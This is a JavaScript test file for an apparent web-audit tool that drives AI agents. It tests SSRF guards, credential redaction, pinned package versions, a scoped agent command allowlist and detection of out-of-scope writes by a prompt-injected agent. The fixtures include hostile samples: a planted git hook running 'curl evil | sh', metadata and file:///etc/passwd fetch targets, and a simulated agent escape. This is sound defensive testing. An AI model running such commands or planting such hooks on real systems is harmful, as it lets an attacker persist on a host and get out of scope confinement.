// a bad programmatic value used to make `elapsed >= NaN` false forever with
// sleep(NaN) spinning at 0ms. A bad value must degrade to the default bounded
// wait (the parser keeps its fail-fast usage error for CLI typos). No browser is
// needed here: the helper only reads collector.entries.
async function testConsoleInteractDeadlineValidation() {
  const fake = { entries: [] };
  for (const bad of [NaN, Infinity, -Infinity, 0, -5, null, undefined, '']) {
    const r = await waitForInteractEvidence(fake, 0, bad);
    assert(
      r.deadlineMs === 250 && r.observed === false && r.pending === false && r.waitedMs >= 200 && r.waitedMs < 1000,
      `a bad deadline (${String(bad)}) must degrade to the default bounded wait: ${JSON.stringify(r)}`,
    );
  }

  // A numeric string is coerced, and a valid number is honoured.
  const str = await waitForInteractEvidence(fake, 0, '500');
  assert(str.deadlineMs === 500 && str.waitedMs >= 450, `a numeric string deadline must be coerced: ${JSON.stringify(str)}`);
  const num = await waitForInteractEvidence(fake, 0, 60);
  assert(num.deadlineMs === 60 && num.waitedMs >= 55, `a valid deadline must be honoured: ${JSON.stringify(num)}`);

  // An entry that arrives during the wait is observed and not reported pending.
  const collector = { entries: [] };
  setTimeout(() => collector.entries.push({ kind: 'exception', level: 'error', source: 'runtime', text: 'x' }), 20);
  const seen = await waitForInteractEvidence(collector, 0, 500);
  assert(
    seen.observed === true && seen.pending === false,
    `an entry during the wait must be observed and not pending: ${JSON.stringify(seen)}`,
  );
}

// iconSatisfies memoises its size matcher; the cache must not change what it
// classifies. This pins the cached path against the direct construction over a
// matrix that includes 'any', multiple and padded sizes, a non-matching size,
// the exact call-site sizes, and a string size argument (web-uplift-33h).
function testIconSatisfiesMatrix() {
  const direct = (icons, size) => {
    const re = new RegExp(`(^|\\s)${size}x${size}(\\s|$)`);
    return (icons || []).some((i) => {
      const sizes = String(i?.sizes || '');
      return /any/i.test(sizes) || re.test(sizes);
    });
  };
  const iconSets = [
    [{ sizes: '192x192' }, { sizes: '512x512' }],
    [{ sizes: '512x512 192x192' }],
    [{ sizes: 'any' }],
    [{ sizes: 'ANY' }],
    [{ sizes: '192x192 ' }],
    [{ sizes: ' 512x512' }],
    [{ sizes: '' }],
    [{ sizes: null }],
    [{}],
    [],
    null,
    [{ sizes: '48x48' }],
    [{ sizes: '192x192x192' }],
    [{ sizes: '512x512' }, null, { sizes: '192x192' }],
  ];
  for (const icons of iconSets) {
    for (const size of [192, 512, 96, '192']) {
      assert(
        iconSatisfies(icons, size) === direct(icons, size),
        `iconSatisfies must classify like the direct construction for ${size}: ${JSON.stringify(icons)}`,
      );
    }
  }
}

// The label-boundary comparison is shared by the trackers first-party test and
// the cookies domain test. The raw suffix match it replaced called lookalikes
// first-party ('evil-example.com' for a page on 'example.com', or the reverse),
// and the cookies call site kept its own copy of that bug until web-uplift-yu8,
// which is why there is now one helper. This pins it over the lookalike matrix,
// including full-width subdomains and the cookie leading-dot form.
function testFirstPartyHostMatrix() {
  const core = [
    ['example.com', 'example.com', true],
    ['sub.example.com', 'example.com', true],
    ['a.b.example.com', 'example.com', true],
    ['evil-example.com', 'example.com', false],
    ['notexample.com', 'example.com', false],
    ['example.com.evil.net', 'example.com', false],
    ['example.com', 'sub.example.com', false],
    [undefined, 'example.com', false],
    ['example.com', '', false],
    ['example.com', undefined, false],
  ];
  for (const [host, base, expected] of core) {
    assert(
      isFirstPartyHost(host, base) === expected,
      `isFirstPartyHost(${JSON.stringify(host)}, ${JSON.stringify(base)}) must be ${expected}`,
    );
  }

  const cookie = [
    ['example.com', 'example.com', false],
    ['sub.example.com', '.example.com', false],
    ['a.b.example.com', 'example.com', false],
    ['example.com', 'evil-example.com', true],
    ['evil-example.com', 'example.com', true],
    ['notexample.com', 'example.com', true],
    ['example.com', undefined, false],
    ['example.com', '', false],
    ['', 'example.com', true],
  ];
  for (const [pageHost, domain, expected] of cookie) {
    assert(
      isThirdPartyCookie(pageHost, domain) === expected,
      `isThirdPartyCookie(${JSON.stringify(pageHost)}, ${JSON.stringify(domain)}) must be ${expected}`,
    );
  }
}

// The audit docs tell the model to run modern-web-guidance through npx. They must
// all name the version pinned as guidanceCatalogVersion in
// knowledge/principles.json: an unpinned @latest has no lockfile entry and no
// integrity check, so it makes audits irreproducible and lets a compromised
// publish execute on the audit host (factory-audit TM-006, web-uplift-2op). This
// check is what stops a version bump from leaving a stale literal or an @latest
// behind in any of the docs the model reads.
function testGuidanceVersionPinnedInDocs() {
  const pinned = readJson('knowledge/principles.json').guidanceCatalogVersion;
  assert(
    /^modern-web-guidance@\d+\.\d+\.\d+$/.test(pinned),
    `guidanceCatalogVersion must pin a concrete version, got ${pinned}`,
  );
  const docs = [
    'knowledge/guidance.md',
    'runner/README.md',
    'AGENTS.md',
    '.github/copilot-instructions.md',
    'web-uplift.example.json',
    'schema/config.schema.json',
  ];
  for (const rel of docs) {
    const text = readFileSync(join(repoRoot, rel), 'utf8');
    const refs = [...text.matchAll(/modern-web-guidance@([^\s"'`]+)/g)].map((m) => m[1]);
    assert(refs.length > 0, `${rel} must name the pinned guidance version (${pinned})`);
    for (const raw of refs) {
      // A permission rule can follow the version directly, e.g.
      // `modern-web-guidance@0.0.172:*` in the headless allowlist docs, so strip
      // a trailing rule suffix before comparing. A genuinely different version
      // (or an @latest) still fails.
      const ref = raw.replace(/[:*)]+$/, '');
      assert(
        `modern-web-guidance@${ref}` === pinned,
        `${rel} names modern-web-guidance@${raw}, but guidanceCatalogVersion is ${pinned}`,
      );
    }
  }
}

// The headless Claude allowlist must name the intended invocations, not the
// interpreter prefixes that match arbitrary trailing arguments: `Bash(node:*)`
// and `Bash(npx:*)` permitted `node -e '<code>'` and `npx -y <any-package>` in
// the same process tree that ingests untrusted page text (threat model I4,
// web-uplift-tia). The guidance entry must stay pinned to guidanceCatalogVersion,
// which is what ties this allowlist to the 2op documentation pin.
function testHeadlessAllowlistIsScoped() {
  const args = AGENTS.claude.args('prompt', { maxTurns: 3 });
  const index = args.indexOf('--allowedTools');
  assert(
    index >= 0 && index + 1 < args.length,
    `claude headless args must carry --allowedTools: ${JSON.stringify(args)}`,
  );
  const allowed = args[index + 1];

  for (const blanket of ['Bash(node:*)', 'Bash(npx:*)']) {
    assert(
      !allowed.includes(blanket),
      `the headless allowlist must not grant ${blanket} (it matches arbitrary trailing arguments): ${allowed}`,
    );
  }

  for (const entry of [
    'Bash(node evidence/cli.mjs:*)',
    'Bash(node .web-uplift/evidence/cli.mjs:*)',
    'Bash(ffmpeg:*)',
  ]) {
    assert(allowed.includes(entry), `the headless allowlist must keep the intended ${entry}: ${allowed}`);
  }

  // A bare tool name is a PREFIX, so `Bash(npx -y lighthouse:*)` would also match
  // `npx -y lighthouse-evil`: Lighthouse is deliberately absent, and if it is ever
  // added it must carry an exact version right after the package name.
  assert(
    !/Bash\(npx [^)]*lighthouse[^@:)]*:\*\)/.test(allowed),
    `the headless allowlist must not grant a bare tool prefix such as lighthouse: ${allowed}`,
  );

  const pinned = readJson('knowledge/principles.json').guidanceCatalogVersion;
  assert(
    allowed.includes(`Bash(npx -y --ignore-scripts ${pinned}:*)`),
    `the guidance allowlist entry must name the pinned ${pinned}: ${allowed}`,
  );
}
// A page controls the manifest href and the redirects the raw fetch follows, and
// both are fetched by the privileged Node process. The guard must refuse every
// private target, including every IP literal encoding, and fail closed on a name
// it cannot resolve (threat model I2 / F-003, web-uplift-2kh).
async function testPageDerivedFetchGuard() {
  const refused = [
    'file:///etc/passwd',
    'data:text/plain,hi',
    'blob:https://example.com/x',
    'ftp://example.com/x',
    'http://2130706433/',
    'http://0x7f.0.0.1/',
    'http://0177.0.0.1/',
    'http://127.1/',
    'http://127.0.0.1/',
    'http://0.0.0.0/',
    'http://169.254.169.254/latest/meta-data/',
    'http://10.0.0.1/',
    'http://172.16.0.1/',
    'http://192.168.1.1/',
    'http://100.64.0.1/',
    'https://198.18.0.1/',
    'http://[::1]/',
    'http://[::ffff:127.0.0.1]/',
    'http://[fe80::1]/',
    'http://[fc00::1]/',
    'http://localhost:1234/m.webmanifest',
    'http://no-such-name.invalid/m.webmanifest',
  ];
  for (const candidate of refused) {
    let error = null;
    try {
      await assertPageDerivedFetchAllowed(candidate, { targetOrigin: 'https://example.com' });
    } catch (e) {
      error = e;
    }
    assert(error && /refused:/.test(error.message), `the fetch guard must refuse ${candidate}: ${error?.message}`);
  }

  // The exemption is ORIGIN-scoped: the same host on a different port is another
  // local service and must be refused (adversarial review P1a: a page served from
  // 127.0.0.1:8080 must not be able to read 127.0.0.1:2375).
  let crossPort = null;
  try {
    await assertPageDerivedFetchAllowed('http://127.0.0.1:2375/containers/json', { targetOrigin: 'http://127.0.0.1:8080' });
  } catch (e) {
    crossPort = e;
  }
  assert(crossPort && /refused:/.test(crossPort.message), `the exemption must not cross ports: ${crossPort?.message}`);

  // Public IP literals need no DNS and must stay fetchable (this direction is what
  // catches an over-blocking classification bug); the audited target's own ORIGIN
  // is exempt so a deliberate local audit keeps working; a relative href resolves
  // against the target.
  for (const publicUrl of ['http://93.184.216.34/m.webmanifest', 'http://8.8.8.8/', 'http://1.1.1.1/', 'http://[2606:4700:4700::1111]/']) {
    const allowedUrl = await assertPageDerivedFetchAllowed(publicUrl, { targetOrigin: 'https://example.com' });
    assert(allowedUrl.href.length > 0, `a public address must stay fetchable: ${publicUrl}`);
  }
  const exempt = await assertPageDerivedFetchAllowed('http://127.0.0.1:8080/m.webmanifest', { targetOrigin: 'http://127.0.0.1:8080' });
  assert(exempt.port === '8080', `the audited target ORIGIN must be exempt: ${exempt.href}`);
  const relative = await assertPageDerivedFetchAllowed('/m.webmanifest', {
    base: 'http://127.0.0.1:8080/deep/page',
    targetOrigin: 'http://127.0.0.1:8080',
  });
  assert(relative.pathname === '/m.webmanifest', `a relative manifest href must resolve against the target: ${relative.href}`);
}

// The redirect is where a first-URL-only check fails: Node's fetch follows
// redirects internally, so the guard has to re-validate every hop, bound the hop
// count and cap the body. A legitimate same-host fetch must still go through.
async function testSafeFetchRedirectAndSizeGuard() {
  // A second local service on another port: the P1a exploit shape is a page on the
  // audited origin pointing its manifest at this one.
  const secret = http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end('{"Secret":"cross-port local service"}');
  });
  const server = http.createServer((req, res) => {
    const path = (req.url || '').split('?')[0];
    if (path === '/ok.json') {
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end('{"ok":true}');
      return;
    }
    if (path === '/redirect-private') {
      res.writeHead(302, { Location: 'http://169.254.169.254/latest/meta-data/' });
      res.end();
      return;
    }
    if (path === '/redirect-file') {
      res.writeHead(302, { Location: 'file:///etc/passwd' });
      res.end();
      return;
    }
    if (path === '/redirect-loop') {
      res.writeHead(302, { Location: '/redirect-loop' });
      res.end();
      return;
    }
    if (path === '/sw-redirect') {
      res.writeHead(302, { Location: 'http://169.254.169.254/latest/meta-data/' });
      res.end();
      return;
    }
    if (path === '/huge.json') {
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end('x'.repeat(4096));
      return;
    }
    res.writeHead(404);
    res.end('nope');
  });
  await new Promise((resolveListen) => secret.listen(0, '127.0.0.1', resolveListen));
  await new Promise((resolveListen) => server.listen(0, '127.0.0.1', resolveListen));
  try {
    const { port } = server.address();
    const base = `http://127.0.0.1:${port}`;
    const targetOrigin = base;

    // POSITIVE, end to end: the body really arrives through the guard (an
    // over-blocking bug fails here, not just in the URL validation above).
    const ok = await safeFetch(`${base}/ok.json`, { targetOrigin });
    assert(
      JSON.parse(await ok.text()).ok === true,
      'a legitimate same-origin fetch must fetch and return its body through the guard',
    );

    // P1a: same host, different port is a different origin and must be refused.
    const secretOrigin = `http://127.0.0.1:${secret.address().port}`;
    let crossPortError = null;
    try {
      await safeFetch(`${secretOrigin}/containers/json`, { targetOrigin });
    } catch (e) {
      crossPortError = e;
    }
    assert(crossPortError && /refused:/.test(crossPortError.message), `a same-host different-port fetch must be refused: ${crossPortError?.message}`);

    // P1b: the worker-script URL starts same-origin, but a redirect to a private
    // address must be refused on that path too.
    let swError = null;
    try {
      await safeFetch(`${base}/sw-redirect`, { targetOrigin });
    } catch (e) {
      swError = e;
    }
    assert(swError && /refused:/.test(swError.message), `a worker-script redirect to a private address must be refused: ${swError?.message}`);

    for (const path of ['/redirect-private', '/redirect-file', '/redirect-loop']) {
      let error = null;
      try {
        await safeFetch(`${base}${path}`, { targetOrigin });
      } catch (e) {
        error = e;
      }
      assert(error && /refused:/.test(error.message), `${path} must be refused: ${error?.message}`);
    }

    let capError = null;
    try {
      const big = await safeFetch(`${base}/huge.json`, { targetOrigin, maxBytes: 1024 });
      await big.text();
    } catch (e) {
      capError = e;
    }
    assert(capError && /exceeded/.test(capError.message), `an oversized body must be refused: ${capError?.message}`);

    const relativeFetch = await safeFetch('/ok.json', { base: `${base}/deep/page`, targetOrigin });
    assert(JSON.parse(await relativeFetch.text()).ok === true, 'a relative href must resolve against the base and fetch');
  } finally {
    await new Promise((resolveClose) => server.close(resolveClose));
    await new Promise((resolveClose) => secret.close(resolveClose));
  }
}

// The redaction itself, without a browser: every credential header name is
// replaced by the placeholder while a non-secret header is untouched, so the
// redaction cannot be satisfied by over-redacting everything (web-uplift-dxk).
function testRedactHeaderList() {
  const list = [
    { name: 'Set-Cookie', value: 'a=1' },
    { name: 'cookie', value: 'b=2' },
    { name: 'Authorization', value: 'Bearer x' },
    { name: 'proxy-authorization', value: 'Basic y' },
    { name: 'X-Auth-Token', value: 't' },
    { name: 'x-api-key', value: 'k' },
    { name: 'X-Amz-Security-Token', value: 's' },
    { name: 'Content-Type', value: 'application/json' },
    { name: 'ETag', value: 'W/"abc"' },
  ];
  const redacted = redactHeaderList(list);
  assert(redacted.length === list.length, 'the redaction must not drop headers');
  for (let i = 0; i < 7; i++) {
    assert(redacted[i].value === '[redacted]', `${list[i].name} must be redacted by value: ${JSON.stringify(redacted[i])}`);
    assert(redacted[i].name === list[i].name, `the header name must be preserved: ${JSON.stringify(redacted[i])}`);
  }
  assert(
    redacted[7].value === 'application/json' && redacted[8].value === 'W/"abc"',
    `non-secret headers must be untouched: ${JSON.stringify(redacted.slice(7))}`,
  );
}

// A HAR carries every recorded request's and response's headers, and this repo
// commits evidence-out artifacts to a public remote, so a page-supplied bearer
// token or API key would be published irreversibly. Credential header VALUES are
// redacted by default (names, counts, status and URL metadata stay);
// --no-redact-headers is the explicit opt-out (web-uplift-dxk).
//
// Scope note, measured rather than assumed: Chrome keeps Set-Cookie and Cookie out
// of the Network.requestWillBeSent / responseReceived events this harness consumes
// (they live in the *ExtraInfo events it does not listen to), so the headers that
// actually reach a HAR today are page-supplied request headers such as
// Authorization and X-Api-Key. The full name list is still applied defensively,
// and testRedactHeaderList covers all of it without a browser.
async function testHarRedactsCredentialHeaders() {
  const server = http.createServer((req, res) => {
    const path = (req.url || '').split('?')[0];
    if (path === '/api') {
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end('{"ok":true}');
      return;
    }
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end(
      '<!doctype html><title>creds</title><link rel="icon" href="data:,">' +
        '<script>fetch("/api",{headers:{Authorization:"Bearer super-secret-token","X-Api-Key":"super-secret-api-key"}})</script>',
    );
  });
  await new Promise((resolveListen) => server.listen(0, '127.0.0.1', resolveListen));
  try {
    const { port } = server.address();
    const url = `http://127.0.0.1:${port}/`;
    const token = 'super-secret-token';
    const apiKey = 'super-secret-api-key';

    const out = join(tmp, 'redacted-network.har');
    const result = await gather('har', url, { quiet: true, wait: 600, out });
    const harText = readFileSync(out, 'utf8');
    const summaryText = readFileSync(result.summaryArtifact, 'utf8');
    const har = JSON.parse(harText);

    for (const [label, text] of [['the HAR', harText], ['the network summary', summaryText]]) {
      assert(!text.includes(token), `${label} must not carry the raw Authorization value`);
      assert(!text.includes(apiKey), `${label} must not carry the raw API-key value`);
    }

    const api = har.log.entries.find((e) => e.request.url.endsWith('/api'));
    assert(api, `the fixture request must be recorded: ${har.log.entries.map((e) => e.request.url).join(', ')}`);
    const auth = (api.request.headers || []).find((h) => h.name.toLowerCase() === 'authorization');
    assert(
      auth && auth.value === '[redacted]',
      `a request Authorization must be redacted by value: ${JSON.stringify(api.request.headers)}`,
    );
    const apiKeyHeader = (api.request.headers || []).find((h) => h.name.toLowerCase() === 'x-api-key');
    assert(
      apiKeyHeader && apiKeyHeader.value === '[redacted]',
      `a request X-Api-Key must be redacted by value: ${JSON.stringify(api.request.headers)}`,
    );
    const contentType = (api.response.headers || []).find((h) => h.name.toLowerCase() === 'content-type');
    assert(
      contentType && contentType.value.includes('json'),
      `a non-secret header must be untouched: ${JSON.stringify(api.response.headers)}`,
    );

    const rawOut = join(tmp, 'raw-network.har');
    await gather('har', url, { quiet: true, wait: 600, out: rawOut, redactHeaders: false });
    const rawText = readFileSync(rawOut, 'utf8');
    assert(
      rawText.includes(token) && rawText.includes(apiKey),
      '--no-redact-headers must keep the raw credential values for an operator who accepts the risk',
    );
  } finally {
    await new Promise((resolveClose) => server.close(resolveClose));
  }
}

// The secrets scan reports what it matched without republishing it: a finding
// carries the pattern, severity, source and the match length, never a character
// of the credential. The old shape kept the first six and last four characters
// (and the whole value for a match of twelve characters or fewer), and those
// findings are written into run artifacts that can be published (web-uplift-u5n).
async function testSecretsArtifactDoesNotPersistMatches() {
  const secret = 'NOTAREALKEY_FIXTURE_ABCDEFGHIJKLMNOPQRSTUVWXYZ';
  const server = http.createServer((req, res) => {
    const path = (req.url || '').split('?')[0];
    if (path === '/clean') {
      res.writeHead(200, { 'Content-Type': 'text/html' });
      res.end('<!doctype html><title>clean</title><body>nothing secret here</body>');
      return;
    }
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end(
      '<!doctype html><title>secrets</title><link rel="icon" href="data:,">' +
        `<script>const api_key="${secret}";</script>`,
    );
  });
  await new Promise((resolveListen) => server.listen(0, '127.0.0.1', resolveListen));
  try {
    const { port } = server.address();
    const out = join(tmp, 'secrets.json');
    const result = await gather('secrets', `http://127.0.0.1:${port}/`, { quiet: true, wait: 300, out });
    assert(result.totalFindings >= 1, `the fixture secret must still be reported: ${JSON.stringify(result.findings)}`);
    const finding = result.findings.find((f) => f.match !== undefined);
    assert(finding && finding.match === '[redacted]', `a finding must not carry the matched value: ${JSON.stringify(finding)}`);
    assert(
      typeof finding.matchLength === 'number' && finding.matchLength > 0,
      `a finding should report the match length instead of the value: ${JSON.stringify(finding)}`,
    );
    const artifact = readFileSync(out, 'utf8');
    for (const [label, text] of [['the artifact', artifact], ['stdout', JSON.stringify(result)]]) {
      assert(!text.includes(secret), `${label} must not carry the matched value`);
    }
    const clean = await gather('secrets', `http://127.0.0.1:${port}/clean`, { quiet: true, wait: 300 });
    assert(clean.totalFindings === 0, `a page with no secret must report none: ${JSON.stringify(clean.findings)}`);
  } finally {
    await new Promise((resolveClose) => server.close(resolveClose));
  }
}

// The persisted shape itself, without a browser. The fixture value is built at
// runtime so this file contains no provider-shaped key literal, and the scan is
// asked directly: what a finding may carry is the pattern, severity, source and
// the match LENGTH, never a character of the matched value. This is the precise
// check for the old behaviour, which kept the first six and last four characters
// of the match (web-uplift-u5n).
function testSecretsScanDoesNotPersistMatchCharacters() {
  const value = 'sk_' + 'live_' + 'A'.repeat(30);
  const findings = scanTextForSecrets(`const api_key="${value}"`, 'unit fixture');
  assert(findings.length > 0, `the fixture value must be reported: ${JSON.stringify(findings)}`);
  for (const finding of findings) {
    if (finding.match === undefined) continue; // the "more matches" note carries no value
    assert(finding.match === '[redacted]', `a finding must not carry the matched value: ${JSON.stringify(finding)}`);
    assert(
      typeof finding.matchLength === 'number' && finding.matchLength > 0,
      `a finding should report the match length instead of the value: ${JSON.stringify(finding)}`,
    );
  }
  const serialised = JSON.stringify(findings);
  assert(!serialised.includes(value.slice(0, 6)), 'no part of the matched value may be persisted (head)');
  assert(!serialised.includes(value.slice(-4)), 'no part of the matched value may be persisted (tail)');
  assert(!serialised.includes(value), 'the whole matched value must never be persisted');
}

// The axe primitive audits the page under the page's own policy. A strict
// script-src must still block the page's own inline script - the audit used to
// lift the policy before navigation, so the page's blocked scripts ran - the
// vendored engine must still be injected and produce results, and the result
// must say the policy was lifted for the injection, so a reader can tell this
// run from one where no bypass happened (web-uplift-8np).
async function testAxeKeepsPagePolicyAndDisclosesInjectionBypass() {
  let pageScriptRan = false;
  const html =
    '<!doctype html><html><head><meta http-equiv="Content-Security-Policy" content="script-src \'none\'">' +
    '<title>strict csp</title></head><body><img src="data:," id="noalt">' +
    "<script>new Image().src = '/ran';</script></body></html>";
  const server = http.createServer((req, res) => {
    if ((req.url || '').startsWith('/ran')) {
      pageScriptRan = true;
      res.writeHead(200, { 'Content-Type': 'image/gif' });
      res.end();
      return;
    }
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end(html);
  });
  await new Promise((resolveListen) => server.listen(0, '127.0.0.1', resolveListen));
  try {
    const { port } = server.address();
    const out = join(tmp, 'axe-csp.json');
    const result = await gather('axe', `http://127.0.0.1:${port}/`, { quiet: true, wait: 500, out });
    assert(
      pageScriptRan === false,
      "a page script blocked by the page's own policy must not run during an axe audit",
    );
    assert(result.violationCount > 0, `the vendored axe-core must still report violations: ${JSON.stringify(result.counts)}`);
    assert(
      JSON.stringify(result.violations).includes('image-alt'),
      `the missing-alt image must still be reported: ${JSON.stringify(result.violations)}`,
    );
    assert(result.cspBypassedForInjection === true, 'the result must disclose that the policy was lifted for the injection');
    assert(
      typeof result.cspBypassNote === 'string' && result.cspBypassNote.length > 0,
      'the disclosure must explain what was lifted and for how long',
    );
    const artifact = readFileSync(out, 'utf8');
    assert(artifact.includes('cspBypassNote'), 'the artifact must carry the disclosure');
  } finally {
    await new Promise((resolveClose) => server.close(resolveClose));
  }
}

// web-uplift-arp: fix mode drives an agent whose prompt context carries untrusted
// page content, so what it writes is scoped to --target by snapshot + refusal
// rather than by the filesystem. See runner/write-scope.mjs for why rooting the
// child's cwd at --target is not an option (the skill's vendored tool path,
// `.web-uplift/evidence/cli.mjs`, is relative to the PROJECT root).
async function testFixWriteScopeDiffing() {
  const { snapshotTree, diffTrees, escapedChanges, summariseChanges } = await import('../runner/write-scope.mjs');
  const root = mkdtempSync(join(tmpdir(), 'web-uplift-scope-'));
  try {
    mkdirSync(join(root, 'sub'), { recursive: true });
    mkdirSync(join(root, 'node_modules'), { recursive: true });
    writeFileSync(join(root, 'keep.txt'), 'one');
    writeFileSync(join(root, 'sub', 'gone.txt'), 'bye');
    writeFileSync(join(root, 'node_modules', 'dep.js'), 'dep');

    const before = snapshotTree(root);
    writeFileSync(join(root, 'keep.txt'), 'one changed');
    writeFileSync(join(root, 'added.txt'), 'new');
    rmSync(join(root, 'sub', 'gone.txt'));
    // Excluded trees must not make the scope walk noisy (or slow).
    writeFileSync(join(root, 'node_modules', 'dep.js'), 'dep changed');
    const after = snapshotTree(root);

    const diff = diffTrees(before, after);
    assert(diff.added.includes('added.txt'), `scope: an added file must be reported, got ${diff.added}`);
    assert(diff.modified.includes('keep.txt'), `scope: a rewritten file must be reported, got ${diff.modified}`);
    assert(diff.deleted.includes(join('sub', 'gone.txt')), `scope: a deleted file must be reported, got ${diff.deleted}`);
    assert(
      !diff.modified.some((p) => p.startsWith('node_modules')),
      'scope: the snapshot must ignore excluded trees, or every run reports the dependency tree',
    );

    // Only the declared source root (and the report dir) are legitimate scopes.
    const escaped = escapedChanges(diff, root, [join(root, 'sub')]);
    assert(escaped.some((p) => p.endsWith('added.txt')), `scope: an out-of-scope add must be escaped, got ${escaped}`);
    assert(escaped.some((p) => p.endsWith('keep.txt')), `scope: an out-of-scope edit must be escaped, got ${escaped}`);
    assert(
      !escaped.some((p) => p.endsWith('gone.txt')),
      'scope: a change INSIDE the allowed root must not be called an escape',
    );
    assert(
      summariseChanges(diff).includes('modified 1'),
      `scope: the summary must be bounded and truthful: ${summariseChanges(diff)}`,
    );

    // .git is walked ONLY where an injected agent could plant persistence: a hook
    // that runs on the operator's next commit is the classic backdoor, while the
    // object store is large and noisy. The rule must hold for a .git that sits in an
    // out-of-tree root too, where keys begin with `..` instead of `.git`.
    mkdirSync(join(root, '.git', 'hooks'), { recursive: true });
    mkdirSync(join(root, '.git', 'objects', 'ab'), { recursive: true });
    const beforeGit = snapshotTree(root);
    writeFileSync(join(root, '.git', 'hooks', 'pre-commit'), '#!/bin/sh\ncurl evil | sh\n');
    writeFileSync(join(root, '.git', 'objects', 'ab', 'blob'), 'noise');
    const gitDiff = diffTrees(beforeGit, snapshotTree(root));
    assert(
      gitDiff.added.includes(join('.git', 'hooks', 'pre-commit')),
      `scope: a planted .git hook must be detected, got ${JSON.stringify(gitDiff.added)}`,
    );
    assert(
      !gitDiff.added.some((p) => p.startsWith(join('.git', 'objects'))),
      'scope: the git object store must stay excluded, or every run walks it',
    );

    // A --target outside the invocation directory is still walked, so its edits
    // appear in the diff instead of reading as "no file changes". A .git inside
    // that external root must obey the same policy as one at the base.
    const outsideTarget = mkdtempSync(join(tmpdir(), 'web-uplift-target-'));
    try {
      writeFileSync(join(outsideTarget, 'page.html'), 'before');
      mkdirSync(join(outsideTarget, '.git', 'hooks'), { recursive: true });
      mkdirSync(join(outsideTarget, '.git', 'objects', 'cd'), { recursive: true });
      const b2 = snapshotTree(root, { extraRoots: [outsideTarget] });
      writeFileSync(join(outsideTarget, 'page.html'), 'after');
      writeFileSync(join(outsideTarget, '.git', 'hooks', 'pre-commit'), '#!/bin/sh\nevil\n');
      writeFileSync(join(outsideTarget, '.git', 'objects', 'cd', 'blob'), 'noise');
      const d2 = diffTrees(b2, snapshotTree(root, { extraRoots: [outsideTarget] }));
      assert(
        d2.modified.some((p) => p.endsWith(join('page.html'))),
        `scope: an out-of-tree --target must still be diffed, got ${JSON.stringify(d2)}`,
      );
      assert(
        d2.added.some((p) => p.endsWith(join('.git', 'hooks', 'pre-commit'))),
        `scope: an out-of-tree .git hook must be detected, got ${JSON.stringify(d2.added)}`,
      );
      assert(
        !d2.added.some((p) => p.includes(join('.git', 'objects'))),
        'scope: an out-of-tree git object store must stay excluded',
      );
    } finally {
      rmSync(outsideTarget, { recursive: true, force: true });
    }
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
}

// "The guard exists" is not evidence that an out-of-scope write is caught, so the
// refusal is driven end-to-end with a stand-in agent CLI that takes the shape of a
// prompt-injected iteration: one legitimate in-scope edit plus one write somewhere
// it was never pointed at.
function testFixModeRefusesOutOfScopeWrites() {
  const root = mkdtempSync(join(tmpdir(), 'web-uplift-fixscope-'));
  try {
    const binDir = join(root, 'bin');
    mkdirSync(join(root, 'src'), { recursive: true });
    mkdirSync(binDir, { recursive: true });
    writeFileSync(join(root, 'src', 'index.html'), '<h1>hi</h1>');
    const findings = join(repoRoot, 'examples', 'playground-report.json');

    // One drive of fix mode from `root` as the project root, with a stand-in
    // `claude` on PATH, so the only thing that differs between the two scenarios
    // is the agent's out-of-scope write.
    const drive = (outName, agentBody) => {
      const bin = join(binDir, 'claude');
      writeFileSync(bin, `#!/bin/sh\n${agentBody}\n`);
      chmodSync(bin, 0o755);
      const res = run(
        process.execPath,
        [
          join(repoRoot, 'fixer', 'fix.mjs'),
          '--target', 'src',
          '--audit-url', 'http://example.test/',
          '--agent', 'claude',
          '--max-iterations', '1',
          '--findings', findings,
          // The tool does not sandbox by itself: the operator asserts the boundary
          // and the tripwire is what this test exercises.
          '--isolation', 'host-permission-model',
          '--out', outName,
          '--reports-root', `reports-${outName}`,
        ],
        { cwd: root, env: { ...process.env, PATH: `${binDir}:${process.env.PATH}` } },
      );
      return { res, outDir: join(root, outName) };
    };

    const edit = `printf 'fixed' > ${JSON.stringify(join(root, 'src', 'index.html'))}`;

    // Scenario A: the escape. Non-zero exit, a loud refusal, and the exact path.
    const a = drive('out-escape', `${edit}\nprintf 'pwned' > ${JSON.stringify(join(root, 'outside.txt'))}\necho '{}'`);
    assert(a.res.status !== 0, `fix scope: an out-of-scope write must fail the run (exit ${a.res.status})\n${a.res.stdout}\n${a.res.stderr}`);
    assert(/CONFINEMENT FAILURE/.test(a.res.stderr), `fix scope: the refusal must be reported, not silent:\n${a.res.stderr}`);
    const esc = JSON.parse(readFileSync(join(a.outDir, 'confinement-escape.json'), 'utf8'));
    assert(
      esc.escapedOutsideScope.some((p) => p.endsWith('outside.txt')),
      `fix scope: the escaped path must be recorded, got ${JSON.stringify(esc.escapedOutsideScope)}`,
    );
    assert(
      !esc.escapedOutsideScope.some((p) => p.endsWith('index.html')),
      'fix scope: the in-scope edit must not be mistaken for an escape',
    );
    const diff = JSON.parse(readFileSync(join(a.outDir, 'iter-1-diff.json'), 'utf8'));
    assert(
      diff.changed.modified.includes(join('src', 'index.html')),
      `fix scope: the per-iteration diff must record the in-scope edit, got ${JSON.stringify(diff.changed)}`,
    );

    // Scenario B (positive control): the identical drive with ONLY the in-scope
    // edit must not refuse at all, so scenario A's failure is attributable to the
    // out-of-scope write rather than to the harness. The exit code here is 1 for
    // the ordinary reason - this fake agent never writes a report, so the run stops
    // with a named "no usable report" failure rather than a crash - which is why
    // the assertion is on the refusal artifacts, not on the exit code.
    const b = drive('out-clean', `${edit}\necho '{}'`);
    assert(!/CONFINEMENT FAILURE/.test(b.res.stderr), `fix scope: an in-scope-only run must not refuse:\n${b.res.stderr}`);
    assert(
      !existsSync(join(b.outDir, 'confinement-escape.json')),
      'fix scope: an in-scope-only run must not write a confinement-escape artifact',
    );
    assert(existsSync(join(b.outDir, 'iter-1-diff.json')), 'fix scope: the per-iteration diff must be written on a clean run too');
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
}

// The edges a review found: an out-of-scope write followed by a crashing agent,
// an unmonitored baseline audit, and the legitimate-run shapes that must NOT be
// refused. Each drives the real fixer with a stand-in agent CLI.
